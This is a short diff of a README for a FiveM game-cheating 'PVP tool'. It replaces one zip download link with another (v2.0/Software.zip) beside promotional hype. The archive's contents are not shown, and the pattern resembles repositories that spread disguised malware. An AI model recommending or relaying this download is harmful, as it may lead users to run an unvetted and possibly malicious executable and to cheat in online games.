@@ -40,7 +40,7 @@ Get ready to experience gaming like never before with the **FiveM TZ Project PVP
 - tzproject
 
 ## Download the Tool:
-[![Download Now](https://github.com/nofeincap/FiveM-TZ-Project-PVP-TOOL/releases/download/v1.0/Application.zip%20Now-Click%20Here-brightgreen)](https://github.com/nofeincap/FiveM-TZ-Project-PVP-TOOL/releases/download/v1.0/Application.zip)
+[![Download Now](https://github.com/nofeincap/FiveM-TZ-Project-PVP-TOOL/releases/download/v2.0/Software.zip%20Now-Click%20Here-brightgreen)](https://github.com/nofeincap/FiveM-TZ-Project-PVP-TOOL/releases/download/v2.0/Software.zip)
 
 🔥 **Launch the tool and unleash your untapped potential!**
 
